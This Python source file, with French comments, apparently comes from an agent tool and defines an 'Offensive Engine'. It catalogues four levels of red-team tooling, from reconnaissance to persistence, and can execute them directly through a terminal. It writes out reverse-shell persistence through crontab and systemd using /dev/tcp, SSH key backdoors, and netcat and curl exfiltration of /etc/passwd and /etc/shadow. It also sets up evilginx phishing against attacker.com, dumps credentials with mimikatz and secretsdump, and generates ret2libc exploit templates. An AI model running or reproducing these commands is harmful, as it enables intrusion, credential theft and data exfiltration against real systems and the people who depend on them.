"""
Offensive Engine — 4 niveaux d'expertise Red Team + pipeline fuzzing→exploit.

Niveau 1 : Reconnaissance avancée
Niveau 2 : Recherche de vulnérabilités (fuzzing, analyse mémoire)
Niveau 3 : Exploitation (RCE, privesc, binary exploits)
Niveau 4 : Mouvement avancé (pivot, persistance, APT)
"""
from __future__ import annotations
import os
import re
import subprocess
from dataclasses import dataclass, field
from typing import List, Optional
from core.tools.terminal import terminal
from core.tools.logger import get_logger

logger = get_logger(__name__)

# ── Structures de données ─────────────────────────────────────────────────────

@dataclass
class OTool:
    name: str
    description: str
    commands: List[str]
    level: int
    category: str
    needs_root: bool = False
    installed: bool = True


@dataclass
class OLevel:
    number: int
    name: str
    icon: str
    color: str
    impact: str
    description: str
    tools: List[OTool] = field(default_factory=list)


# ── Catalogue des 4 niveaux ───────────────────────────────────────────────────

LEVEL_1 = OLevel(
    number=1,
    name="Reconnaissance avancée",
    icon="🔍",
    color="#38bdf8",
    impact="Préparation d'attaque, espionnage, cartographie d'infrastructure",
    description="Analyser logiciels, comprendre systèmes, cartographier infrastructures",
    tools=[
        OTool("nmap",         "Scan ports/services/OS",
              ["nmap -sV -sC -p- --open -T4 {target}",
               "nmap --script vuln -p 80,443,445,22 {target}",
               "nmap -sU --top-ports 100 {target}"],
              1, "network"),
        OTool("masscan",      "Scan ultra-rapide (millions ports/s)",
              ["masscan -p1-65535 {target} --rate=5000"],
              1, "network"),
        OTool("rustscan",     "Scan rapide Rust → pipe nmap",
              ["rustscan -a {target} -- -sV -sC"],
              1, "network"),
        OTool("theharvester", "OSINT emails/noms/IPs/URLs",
              ["theharvester -d {domain} -b all",
               "theharvester -d {domain} -b google,bing,linkedin"],
              1, "osint"),
        OTool("amass",        "Cartographie surface d'attaque",
              ["amass enum -d {domain}",
               "amass enum -active -d {domain}"],
              1, "osint"),
        OTool("recon-ng",     "Framework OSINT modulaire",
              ["recon-ng -m recon/domains-hosts/google_site_web -o SOURCE={domain}"],
              1, "osint"),
        OTool("spiderfoot",   "OSINT automatisé 200+ modules",
              ["spiderfoot -s {target} -t IP_ADDRESS,DOMAIN_NAME -q"],
              1, "osint"),
        OTool("shodan",       "Moteur de recherche d'appareils exposés sur Internet",
              ["shodan search 'apache country:FR'",
               "shodan host {ip}",
               "shodan stats --facets country,port 'default password'"],
              1, "osint"),
        OTool("maltego",      "Graphe de relations OSINT — personnes/domaines/IPs",
              ["maltego"],
              1, "osint"),
        OTool("gobuster",     "Brute-force répertoires/DNS/vhosts",
              ["gobuster dir -u http://{target} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js",
               "gobuster dns -d {domain} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"],
              1, "web"),
        OTool("nuclei",       "Scanner CVE/misconfig template-based",
              ["nuclei -u http://{target}",
               "nuclei -l targets.txt -t cves/ -severity critical,high"],
              1, "web"),
        OTool("nikto",        "Scanner vulnérabilités web",
              ["nikto -h http://{target}"],
              1, "web"),
        OTool("whatweb",      "Fingerprinting technologies web",
              ["whatweb -a 3 http://{target}"],
              1, "web"),
        OTool("strings",      "Extraction chaînes d'un binaire",
              ["strings {binary}", "strings -n 8 {binary} | grep -i pass"],
              1, "binary"),
        OTool("readelf",      "Headers/sections/symboles ELF",
              ["readelf -a {binary}", "readelf -s {binary} | grep -i func"],
              1, "binary"),
        OTool("objdump",      "Désassemblage binaires ELF/PE",
              ["objdump -d -M intel {binary}", "objdump -t {binary}"],
              1, "binary"),
        OTool("exiftool",     "Métadonnées fichiers",
              ["exiftool {file}"],
              1, "binary"),
        OTool("binwalk",      "Analyse firmwares/extractions",
              ["binwalk {file}", "binwalk -e {file}"],
              1, "binary"),
    ]
)

LEVEL_2 = OLevel(
    number=2,
    name="Recherche de vulnérabilités",
    icon="🐛",
    color="#a78bfa",
    impact="Découverte de vulnérabilités inconnues (0-day potentiel)",
    description="Fuzzing (AFL++/libFuzzer), bugs mémoire, erreurs logiques",
    tools=[
        OTool("afl-fuzz",     "Fuzzer couverture-guidé (AFL++) — génération crashs",
              ["afl-fuzz -i corpus/ -o findings/ -- ./{binary} @@",
               "afl-fuzz -i corpus/ -o findings/ -m 512 -- ./{binary} @@",
               "AFL_SKIP_CPUFREQ=1 afl-fuzz -i corpus/ -o findings/ -- ./{binary} @@"],
              2, "fuzzing"),
        OTool("afl-showmap",  "Cartographie couverture de code",
              ["afl-showmap -o /tmp/map.txt -- ./{binary} < input.txt"],
              2, "fuzzing"),
        OTool("afl-tmin",     "Minimiser corpus AFL++",
              ["afl-tmin -i crash_input -o minimized -- ./{binary} @@"],
              2, "fuzzing"),
        OTool("radamsa",      "Fuzzer mutation généraliste",
              ["radamsa -n 1000 -o fuzz_%n.bin corpus_file",
               "echo 'test' | radamsa | ./{binary}"],
              2, "fuzzing"),
        OTool("honggfuzz",    "Fuzzer couverture multi-processus",
              ["honggfuzz -i corpus/ -o findings/ -- ./{binary} ___FILE___"],
              2, "fuzzing"),
        OTool("gdb",          "Analyse crash — stack trace, registres",
              ["gdb -batch -ex 'run' -ex 'bt full' -ex 'info registers' ./{binary} < {crash}",
               "gdb ./{binary} {corefile}",
               "gdb -ex 'set pagination 0' -ex 'run < {input}' -ex 'bt' ./{binary}"],
              2, "crash_analysis"),
        OTool("checksec",     "Analyse protections binaire (NX/PIE/RELRO/Canary)",
              ["checksec --file=./{binary}",
               "checksec --proc={pid}"],
              2, "crash_analysis"),
        OTool("valgrind",     "Détection bugs mémoire (leaks, overflow, UAF)",
              ["valgrind --tool=memcheck --leak-check=full ./{binary}",
               "valgrind --tool=memcheck --track-origins=yes ./{binary}",
               "valgrind --tool=helgrind ./{binary}"],
              2, "memory"),
        OTool("AddressSanitizer", "Détection buffer overflow/UAF/heap corruption",
              ["gcc -fsanitize=address -g -o {binary}_asan {source}.c",
               "ASAN_OPTIONS=abort_on_error=1 ./{binary}_asan {input}"],
              2, "memory"),
        OTool("semgrep",      "Analyse statique code source (patterns vuln)",
              ["semgrep --config=auto {source_dir}",
               "semgrep --config p/security-audit {source_dir}",
               "semgrep --config p/owasp-top-ten {source_dir}"],
              2, "static"),
        OTool("bandit",       "Analyse sécurité code Python",
              ["bandit -r {source_dir}",
               "bandit -r {source_dir} -l -ii"],
              2, "static"),
        OTool("cppcheck",     "Analyse statique C/C++",
              ["cppcheck --enable=all {source_dir}",
               "cppcheck --enable=security {source_dir}"],
              2, "static"),
        OTool("searchsploit", "Recherche CVE dans ExploitDB",
              ["searchsploit {service} {version}",
               "searchsploit -t 'buffer overflow' {service}"],
              2, "cve"),
        OTool("sqlmap",       "Détection injection SQL",
              ["sqlmap -u 'http://{target}?id=1' --level=5 --risk=3 --dbs",
               "sqlmap -r request.txt --batch --dbs"],
              2, "web_vulns"),
        OTool("nuclei",       "Scan CVE/vulnérabilités connus",
              ["nuclei -u http://{target} -t cves/ -severity critical,high",
               "nuclei -u http://{target} -t vulnerabilities/"],
              2, "web_vulns"),
        OTool("ghidra",       "RE avancé — décompilation Java, analyse binaires (GUI)",
              ["ghidra",
               "ghidra {project_dir} {project_name} -import {binary} -postScript HeadlessAnalyzer.java"],
              2, "reverse"),
        OTool("gdb-pwndbg",   "GDB avec extensions pwndbg — exploit dev, heap, ROP",
              ["gdb -ex 'source /usr/share/pwndbg/gdbinit.py' ./{binary}",
               "gdb ./{binary}"],
              2, "reverse"),
        OTool("r2",           "Radare2 — framework RE complet statique/dynamique",
              ["r2 -A ./{binary}",
               "r2 -q -c 'aaa;pdf @main' ./{binary}"],
              2, "reverse"),
    ]
)

LEVEL_3 = OLevel(
    number=3,
    name="Exploitation",
    icon="💥",
    color="#f97316",
    impact="Prise de contrôle système, RCE, élévation de privilèges",
    description="Transformer bug → contrôle total. RCE, privesc, binary exploits",
    tools=[
        OTool("msfconsole",   "Metasploit Framework — exploits modulaires",
              ["msfconsole -q -x 'use {module}; set RHOSTS {target}; set LHOST {lhost}; run; exit'",
               "msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run'"],
              3, "framework"),
        OTool("msfvenom",     "Génération payloads (reverse shell, shellcode)",
              ["msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o /tmp/shell",
               "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o /tmp/shell.exe",
               "msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o /tmp/shell.php"],
              3, "payload"),
        OTool("pwntools",     "Framework Python exploit dev (ROP, shellcode, format strings)",
              ["python3 -c \"from pwn import *; p = process('./{binary}'); ...\""],
              3, "binary_exploit"),
        OTool("ROPgadget",    "Chaînes ROP pour bypass NX/DEP",
              ["ROPgadget --binary ./{binary}",
               "ROPgadget --binary ./{binary} | grep 'pop rdi'",
               "ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep 'pop rdi'"],
              3, "binary_exploit"),
        OTool("ropper",       "Gadgets ROP/JOP/COP",
              ["ropper -f ./{binary} --search 'pop rdi'",
               "ropper -f ./{binary} --chain execve"],
              3, "binary_exploit"),
        OTool("linpeas",      "Enumération élévation de privilèges Linux",
              ["bash linpeas.sh",
               "bash linpeas.sh -a 2>/dev/null | tee /tmp/linpeas.txt"],
              3, "privesc"),
        OTool("find_suid",    "Trouver binaires SUID exploitables",
              ["find / -perm -4000 -type f 2>/dev/null",
               "find / -perm -4000 -user root -type f 2>/dev/null"],
              3, "privesc"),
        OTool("sudo_enum",    "Énumération droits sudo",
              ["sudo -l",
               "sudo -l 2>/dev/null | grep -v 'Matching\\|password'"],
              3, "privesc"),
        OTool("searchsploit", "Exploit local pour version kernel/service",
              ["searchsploit linux kernel {version}",
               "searchsploit local privilege escalation"],
              3, "privesc"),
        OTool("sqlmap",       "Exploitation SQLi → RCE (--os-shell)",
              ["sqlmap -u '{url}' --os-shell --batch",
               "sqlmap -r request.txt --os-shell --dbms=mysql"],
              3, "web_exploit"),
        OTool("commix",       "Exploitation injection de commandes OS",
              ["commix --url='http://{target}?cmd=id'",
               "commix -r request.txt --os-shell"],
              3, "web_exploit"),
        OTool("xsstrike",     "Exploitation XSS avancée",
              ["xsstrike -u 'http://{target}?q=test'",
               "xsstrike -u 'http://{target}' --crawl"],
              3, "web_exploit"),
        OTool("evil-winrm",   "Shell Windows via WinRM",
              ["evil-winrm -i {target} -u {user} -p '{pass}'",
               "evil-winrm -i {target} -u {user} -H {nthash}"],
              3, "shell"),
        OTool("pwncat",       "Handler shell avancé (post-exploit intégré)",
              ["pwncat-cs -lp {lport}",
               "pwncat-cs {target}:{lport}"],
              3, "shell"),
    ]
)

LEVEL_4 = OLevel(
    number=4,
    name="Mouvement avancé",
    icon="🧠",
    color="#10b981",
    impact="Intrusion longue durée (APT-like), persistance, exfiltration",
    description="Pivot réseau, attaques multi-systèmes, persistance furtive",
    tools=[
        OTool("chisel",       "Tunnel TCP/HTTP — pivot réseau (client/serveur)",
              ["chisel server -p 8080 --reverse",
               "chisel client {server}:8080 R:socks",
               "chisel client {server}:8080 R:{lport}:{target}:{port}"],
              4, "pivot"),
        OTool("ligolo-ng",    "Tunnel réseau inverse haute performance",
              ["ligolo-ng -selfcert -laddr 0.0.0.0:443",
               "ligolo-ng -connect {server}:443 -ignore-cert"],
              4, "pivot"),
        OTool("sshuttle",     "VPN transparent via SSH",
              ["sshuttle -r {user}@{host} {subnet}/24",
               "sshuttle -r {user}@{host} 0/0 --dns"],
              4, "pivot"),
        OTool("proxychains4", "Tunnelisation via proxies (Tor/SOCKS)",
              ["proxychains4 nmap -sT {target}",
               "proxychains4 msfconsole",
               "proxychains4 ssh {user}@{target}"],
              4, "pivot"),
        OTool("crackmapexec", "Mouvement latéral SMB/WMI/LDAP",
              ["crackmapexec smb {subnet}/24 -u {user} -p '{pass}'",
               "crackmapexec smb {target} -u {user} -p '{pass}' --shares",
               "crackmapexec winrm {target} -u {user} -p '{pass}' -x 'whoami'"],
              4, "lateral"),
        OTool("impacket-psexec",      "Exécution commandes via SMB",
              ["impacket-psexec {domain}/{user}:{pass}@{target}",
               "impacket-psexec -hashes :{nthash} {domain}/{user}@{target} cmd.exe"],
              4, "lateral"),
        OTool("impacket-wmiexec",     "Exécution WMI (sans service/fichier)",
              ["impacket-wmiexec {domain}/{user}:{pass}@{target}"],
              4, "lateral"),
        OTool("impacket-secretsdump", "Dump credentials AD (NTDS.dit/SAM/LSA)",
              ["impacket-secretsdump {domain}/{user}:{pass}@{target}",
               "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"],
              4, "lateral"),
        OTool("bloodhound-python",    "Cartographie AD — chemins d'attaque",
              ["bloodhound-python -u {user} -p '{pass}' -d {domain} -c All --zip"],
              4, "lateral"),
        OTool("netexec",      "Swiss army knife Windows/AD (successeur CrackMapExec)",
              ["netexec smb {subnet}/24 -u {user} -p '{pass}'",
               "netexec smb {target} -u {user} -H {nthash} --shares",
               "netexec winrm {target} -u {user} -p '{pass}' -x 'whoami'",
               "netexec ldap {target} -u '' -p '' --users"],
              4, "lateral"),
        OTool("mimikatz",     "Extraction credentials Windows (sekurlsa, lsadump)",
              ["wine /usr/share/mimikatz/x64/mimikatz.exe",
               "meterpreter> load kiwi ; creds_all",
               "lsadump::sam ; sekurlsa::logonpasswords"],
              4, "credentials"),
        OTool("rubeus",       "Attaques Kerberos — AS-REP, Kerberoasting, PTT",
              ["# Kerberoasting (obtenir TGS crackables)",
               "Rubeus.exe kerberoast /outfile:hashes.txt",
               "# AS-REP roasting (pas de pré-auth requis)",
               "Rubeus.exe asreproast",
               "# Pass-the-Ticket",
               "Rubeus.exe ptt /ticket:base64ticket"],
              4, "credentials"),
        OTool("powerview",    "Reconnaissance Windows/AD — énumération PowerShell",
              ["Import-Module PowerView.ps1",
               "Get-NetUser | select samaccountname",
               "Find-LocalAdminAccess",
               "Get-DomainGroupMember -Identity 'Domain Admins'"],
              4, "lateral"),
        # ── C2 Frameworks ────────────────────────────────────────────────────
        OTool("sliver",       "C2 open-source moderne — implants cross-platform",
              ["sliver-server",
               "sliver > generate --mtls --lhost {lhost} --os windows --arch amd64",
               "sliver > mtls --lport 443",
               "sliver > sessions"],
              4, "c2"),
        OTool("havoc",        "C2 open-source récent — GUI + Teamserver",
              ["havoc server --profile havoc.yaotl -v",
               "havoc client"],
              4, "c2"),
        OTool("mythic",       "C2 modulaire multi-agents (Docker)",
              ["docker-compose -f Mythic/docker-compose.yml up -d",
               "# UI : https://localhost:7443"],
              4, "c2"),
        OTool("meterpreter",  "C2 Metasploit — post-exploitation complète",
              ["msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run'",
               "meterpreter> sysinfo ; getuid ; getsystem"],
              4, "c2"),
        # ── Phishing ─────────────────────────────────────────────────────────
        OTool("gophish",      "Campagnes de phishing — landing pages + tracking",
              ["gophish-start",
               "# UI : http://localhost:3333 (admin/admin par défaut)"],
              4, "phishing"),
        OTool("evilginx",     "Proxy phishing MFA bypass — AiTM",
              ["evilginx -p /usr/share/evilginx/phishlets",
               "evilginx > phishlets hostname o365 attacker.com",
               "evilginx > lures create o365"],
              4, "phishing"),
        OTool("setoolkit",    "Social-Engineer Toolkit — phishing/spear-phishing",
              ["setoolkit"],
              4, "phishing"),
        OTool("persist_cron",  "Persistance via crontab",
              ["(crontab -l 2>/dev/null; echo '*/5 * * * * /bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1') | crontab -"],
              4, "persistence", needs_root=False),
        OTool("persist_ssh",   "Persistance via clé SSH autorisée",
              ["mkdir -p ~/.ssh && echo '{pubkey}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"],
              4, "persistence"),
        OTool("persist_systemd", "Backdoor service systemd (root)",
              ["echo '[Unit]\\nDescription=svc\\n[Service]\\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"\\n[Install]\\nWantedBy=multi-user.target' > /etc/systemd/system/svc.service",
               "systemctl enable svc && systemctl start svc"],
              4, "persistence", needs_root=True),
        OTool("exfil_nc",      "Exfiltration données via netcat",
              ["tar czf - /path/to/data | nc {lhost} {lport}",
               "nc {lhost} {lport} < /etc/passwd"],
              4, "exfiltration"),
        OTool("exfil_curl",    "Exfiltration via HTTP (discret)",
              ["curl -s -X POST http://{lhost}:{lport} -d @/etc/passwd",
               "curl -s -F 'data=@/etc/shadow' http://{lhost}:{lport}/upload"],
              4, "exfiltration"),
        OTool("pspy",          "Surveillance processus sans root (cron jobs)",
              ["pspy64", "pspy32"],
              4, "recon_internal"),
        OTool("mimikatz_wine", "Dump credentials Windows (via wine ou meterpreter)",
              ["meterpreter> load kiwi",
               "meterpreter> creds_all"],
              4, "credentials"),
    ]
)

LEVELS = {1: LEVEL_1, 2: LEVEL_2, 3: LEVEL_3, 4: LEVEL_4}


# ── Pipeline Fuzzing → Crash → Reverse → Exploit ─────────────────────────────

class FuzzingPipeline:
    """
    Pipeline complet : fuzzing → triage crash → analyse reverse → exploit dev.
    """

    def run_fuzzing(self, binary: str, corpus_dir: str = "/tmp/corpus",
                    output_dir: str = "/tmp/fuzz_out", timeout: int = 30) -> dict:
        os.makedirs(corpus_dir, exist_ok=True)
        os.makedirs(output_dir, exist_ok=True)

        # Créer un corpus minimal si vide
        if not os.listdir(corpus_dir):
            with open(f"{corpus_dir}/seed", "wb") as f:
                f.write(b"AAAA\n")

        # Vérifier que AFL++ est dispo
        afl = self._which("afl-fuzz")
        if not afl:
            return {"success": False, "error": "afl-fuzz non trouvé. Installer: apt install afl++"}

        cmd = f"AFL_SKIP_CPUFREQ=1 AFL_NO_UI=1 timeout {timeout} afl-fuzz -i {corpus_dir} -o {output_dir} -- {binary} @@"
        result = terminal.run(cmd, timeout=timeout + 5)
        crashes = self._count_crashes(output_dir)
        return {
            "success": True,
            "binary": binary,
            "corpus": corpus_dir,
            "output": output_dir,
            "crashes_found": crashes,
            "result": result.get("stdout", "") + result.get("stderr", ""),
            "next_step": f"analyse_crash {output_dir}/default/crashes/" if crashes > 0 else "Continuer le fuzzing (aucun crash pour l'instant)",
        }

    def analyse_crash(self, binary: str, crash_input: str) -> dict:
        if not os.path.isfile(crash_input):
            return {"success": False, "error": f"Fichier crash introuvable: {crash_input}"}

        results = {}

        # 1. GDB — stack trace + registres
        gdb_script = "/tmp/gdb_crash.py"
        with open(gdb_script, "w") as f:
            f.write(f"""
import gdb
gdb.execute("file {binary}")
gdb.execute("run < {crash_input}")
gdb.execute("bt full")
gdb.execute("info registers")
gdb.execute("x/20xg $rsp")
gdb.execute("quit")
""")
        gdb_result = terminal.run(
            f"gdb -batch -ex 'run < {crash_input}' -ex 'bt full' -ex 'info registers' {binary}",
            timeout=30
        )
        results["gdb"] = gdb_result.get("stdout", "") + gdb_result.get("stderr", "")

        # 2. Checksec — protections du binaire
        checksec_result = terminal.run(f"checksec --file={binary}", timeout=10)
        results["checksec"] = checksec_result.get("stdout", "")

        # 3. Exploitation score
        exploitable = self._score_exploitability(results["gdb"])

        return {
            "success": True,
            "binary": binary,
            "crash_input": crash_input,
            "exploitability": exploitable,
            "gdb_trace": results["gdb"][:2000],
            "protections": results["checksec"],
            "next_step": "reverse_analysis" if exploitable["score"] >= 5 else "fuzzing_continue",
            "recommendation": exploitable["recommendation"],
        }

    def reverse_analysis(self, binary: str) -> dict:
        results = {}

        # Checksec
        cs = terminal.run(f"checksec --file={binary}", timeout=10)
        results["checksec"] = cs.get("stdout", "")

        # Strings intéressantes
        strings = terminal.run(f"strings {binary}", timeout=15)
        interesting = [
            line for line in strings.get("stdout", "").splitlines()
            if any(kw in line.lower() for kw in ["pass", "key", "secret", "flag", "admin", "/bin/sh", "system", "execve"])
        ]
        results["interesting_strings"] = interesting[:20]

        # Fonctions (symboles)
        nm = terminal.run(f"nm -D {binary} 2>/dev/null || readelf -s {binary}", timeout=10)
        dangerous_funcs = [
            line for line in nm.get("stdout", "").splitlines()
            if any(fn in line for fn in ["gets", "strcpy", "sprintf", "system", "exec", "popen", "scanf"])
        ]
        results["dangerous_functions"] = dangerous_funcs[:15]

        # ROP gadgets
        rop = terminal.run(f"ROPgadget --binary {binary} 2>/dev/null | head -50", timeout=30)
        results["rop_gadgets"] = rop.get("stdout", "")[:1500]

        # Disassembly main
        objdump = terminal.run(f"objdump -d -M intel {binary} | grep -A 30 '<main>'", timeout=20)
        results["main_asm"] = objdump.get("stdout", "")[:1500]

        return {
            "success": True,
            "binary": binary,
            "checksec": results["checksec"],
            "interesting_strings": results["interesting_strings"],
            "dangerous_functions": results["dangerous_functions"],
            "rop_gadgets_sample": results["rop_gadgets"],
            "main_disasm": results["main_asm"],
            "next_step": "exploit_dev",
        }

    def generate_exploit_template(self, binary: str, offset: int = 0,
                                   lhost: str = "127.0.0.1", lport: int = 4444) -> dict:
        cs = terminal.run(f"checksec --file={binary}", timeout=10)
        protections = cs.get("stdout", "")

        nx = "NX enabled" in protections
        pie = "PIE enabled" in protections
        canary = "Canary found" in protections

        # Choisir la stratégie
        if not nx and not pie and not canary:
            strategy = "ret2shellcode"
        elif nx and not pie:
            strategy = "ret2libc"
        elif nx and pie:
            strategy = "rop_chain"
        else:
            strategy = "rop_chain"

        template = self._build_pwntools_template(binary, offset, lhost, lport, strategy, nx, pie, canary)

        return {
            "success": True,
            "binary": binary,
            "offset": offset,
            "protections": {
                "nx": nx, "pie": pie, "canary": canary,
                "raw": protections
            },
            "strategy": strategy,
            "exploit_template": template,
            "next_step": f"python3 exploit_{os.path.basename(binary)}.py",
        }

    # ── Helpers ───────────────────────────────────────────────────────────────

    @staticmethod
    def _which(cmd: str) -> Optional[str]:
        result = subprocess.run(["which", cmd], capture_output=True, text=True)
        return result.stdout.strip() if result.returncode == 0 else None

    @staticmethod
    def _count_crashes(output_dir: str) -> int:
        crash_dir = os.path.join(output_dir, "default", "crashes")
        if not os.path.isdir(crash_dir):
            return 0
        return len([f for f in os.listdir(crash_dir) if f != "README.txt"])

    @staticmethod
    def _score_exploitability(gdb_output: str) -> dict:
        score = 0
        indicators = []

        if "SIGSEGV" in gdb_output:
            score += 4; indicators.append("SIGSEGV (segfault)")
        if "SIGABRT" in gdb_output:
            score += 2; indicators.append("SIGABRT (abort)")
        if "rip" in gdb_output.lower() and "0x41414141" in gdb_output:
            score += 5; indicators.append("RIP contrôlable !")
        if "0x41414141" in gdb_output or "0x4141414141414141" in gdb_output:
            score += 4; indicators.append("Pattern dans registres")
        if "stack smashing" in gdb_output.lower():
            score += 3; indicators.append("Stack smashing détecté")
        if "heap" in gdb_output.lower() and ("free" in gdb_output.lower() or "malloc" in gdb_output.lower()):
            score += 3; indicators.append("Heap corruption possible")

        if score >= 7:
            rec = "CRITIQUE — Exploitabilité très haute. Passer à reverse_analysis."
        elif score >= 4:
            rec = "MOYEN — Bug exploitable potentiellement. Analyser le contrôle du flux."
        elif score >= 1:
            rec = "FAIBLE — Crash détecté mais exploitabilité incertaine."
        else:
            rec = "NON EXPLOITABLE — Crash sans contrôle apparent."

        return {"score": score, "indicators": indicators, "recommendation": rec}

    @staticmethod
    def _build_pwntools_template(binary: str, offset: int, lhost: str, lport: int,
                                  strategy: str, nx: bool, pie: bool, canary: bool) -> str:
        b = os.path.basename(binary)

        header = f"""#!/usr/bin/env python3
# Exploit généré par L'Œil de Dieu — Strategy: {strategy}
# Binary: {binary}
# Protections: NX={nx}, PIE={pie}, Canary={canary}

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

binary = ELF('{binary}')
{"libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')" if nx else ""}

# p = process('{binary}')                 # Local
p = remote('{lhost}', {lport})             # Remote

OFFSET = {offset if offset else 'OFFSET_A_CALCULER'}  # cyclic(200) → find offset
"""

        if strategy == "ret2shellcode":
            body = f"""
# Stratégie: ret2shellcode (pas de NX)
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(OFFSET, b'A')
# payload += p64(STACK_ADDR)  # Adresse du shellcode sur la stack

p.sendlineafter(b'> ', payload)
p.interactive()
"""
        elif strategy == "ret2libc":
            body = f"""
# Stratégie: ret2libc (NX actif, pas de PIE)
# Étape 1: leak adresse libc via puts/printf
rop = ROP(binary)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

# Leak puts@GOT
payload  = b'A' * OFFSET
payload += p64(pop_rdi)
payload += p64(binary.got['puts'])
payload += p64(binary.plt['puts'])
payload += p64(binary.sym['main'])

p.sendlineafter(b'> ', payload)
leak = u64(p.recvline().strip().ljust(8, b'\\x00'))
log.success(f'puts @ {{hex(leak)}}')

libc.address = leak - libc.sym['puts']
log.success(f'libc base: {{hex(libc.address)}}')

# Étape 2: RCE via system('/bin/sh')
payload2  = b'A' * OFFSET
payload2 += p64(ret)               # Stack alignment
payload2 += p64(pop_rdi)
payload2 += p64(next(libc.search(b'/bin/sh')))
payload2 += p64(libc.sym['system'])

p.sendlineafter(b'> ', payload2)
p.interactive()
"""
        else:  # rop_chain
            body = f"""
# Stratégie: ROP chain (NX + PIE actifs)
# Nécessite un leak PIE pour calculer les adresses

# Étape 1: Obtenir le leak de base PIE
# (adapter selon le binaire — printf/puts/info leak)

# Étape 2: Construire la ROP chain
rop = ROP(binary)
# rop.call('system', [next(binary.search(b'/bin/sh'))])

payload = b'A' * OFFSET
# payload += rop.chain()

p.sendlineafter(b'> ', payload)
p.interactive()
"""

        return header + body


# ── Dispatcher principal ──────────────────────────────────────────────────────

class OffensiveEngine:

    def __init__(self):
        self.pipeline = FuzzingPipeline()

    def get_level(self, n: int) -> Optional[OLevel]:
        return LEVELS.get(n)

    def get_all_levels(self) -> dict:
        return {
            n: {
                "number": lvl.number,
                "name": lvl.name,
                "icon": lvl.icon,
                "color": lvl.color,
                "impact": lvl.impact,
                "description": lvl.description,
                "tools_count": len(lvl.tools),
                "tools": [
                    {"name": t.name, "description": t.description,
                     "category": t.category, "needs_root": t.needs_root}
                    for t in lvl.tools
                ],
            }
            for n, lvl in LEVELS.items()
        }

    def detect_level(self, task: str) -> int:
        t = task.lower()
        # Niveau 4 — mots-clés pivoting/persistance/C2/phishing/AD
        if any(kw in t for kw in ["pivot", "tunnel", "chisel", "ligolo", "persist", "persistance",
                                   "crontab", "lateral", "mouvement", "exfil", "c2",
                                   "bloodhound", "secretsdump", "pass-the-hash", "pth", "pspy",
                                   "crackmapexec", "netexec", "wmiexec", "proxychains", "sshuttle",
                                   "sliver", "havoc", "mythic", "meterpreter", "cobalt",
                                   "phishing", "gophish", "evilginx",
                                   "mimikatz", "rubeus", "powerview", "kerberoast",
                                   "as-rep", "asrep", "pass-the-ticket"]):
            return 4
        # Niveau 3 — mots-clés exploitation
        if any(kw in t for kw in ["exploit", "rce", "privesc", "privilege", "élévation",
                                   "linpeas", "suid", "sudo -l", "metasploit", "msfconsole",
                                   "payload", "reverse shell", "rop chain", "pwntools",
                                   "buffer overflow", "ret2libc", "shellcode", "heap spray"]):
            return 3
        # Niveau 2 — mots-clés vulns/fuzzing/reverse
        if any(kw in t for kw in ["fuzz", "afl", "crash", "valgrind", "asan", "sanitizer",
                                   "0-day", "zeroday", "cve", "vuln", "overflow", "uaf",
                                   "use after free", "bug", "semgrep", "bandit", "static",
                                   "ghidra", "radare", "r2 analyse", "reverse engineer"]):
            return 2
        # Niveau 1 — recon par défaut
        return 1

    def run_pipeline(self, stage: str, **kwargs) -> dict:
        if stage == "fuzz":
            return self.pipeline.run_fuzzing(
                kwargs.get("binary", ""), kwargs.get("corpus", "/tmp/corpus"),
                kwargs.get("output", "/tmp/fuzz_out"), kwargs.get("timeout", 30)
            )
        elif stage == "analyse_crash":
            return self.pipeline.analyse_crash(
                kwargs.get("binary", ""), kwargs.get("crash", "")
            )
        elif stage == "reverse":
            return self.pipeline.reverse_analysis(kwargs.get("binary", ""))
        elif stage == "exploit_template":
            return self.pipeline.generate_exploit_template(
                kwargs.get("binary", ""), kwargs.get("offset", 0),
                kwargs.get("lhost", "127.0.0.1"), kwargs.get("lport", 4444)
            )
        return {"success": False, "error": f"Stage inconnu: {stage}"}

    def run_level_tool(self, level: int, tool_name: str, params: dict) -> dict:
        lvl = self.get_level(level)
        if not lvl:
            return {"success": False, "error": f"Niveau {level} inexistant"}
        tool = next((t for t in lvl.tools if t.name == tool_name), None)
        if not tool:
            return {"success": False, "error": f"Outil {tool_name} non trouvé au niveau {level}"}

        cmd = tool.commands[0]
        for k, v in params.items():
            cmd = cmd.replace(f"{{{k}}}", str(v))

        result = terminal.run(cmd, timeout=120)
        return {
            "success": result.get("success", False),
            "level": level,
            "tool": tool_name,
            "command": cmd,
            "output": result.get("stdout", "") + result.get("stderr", ""),
        }


offensive = OffensiveEngine()
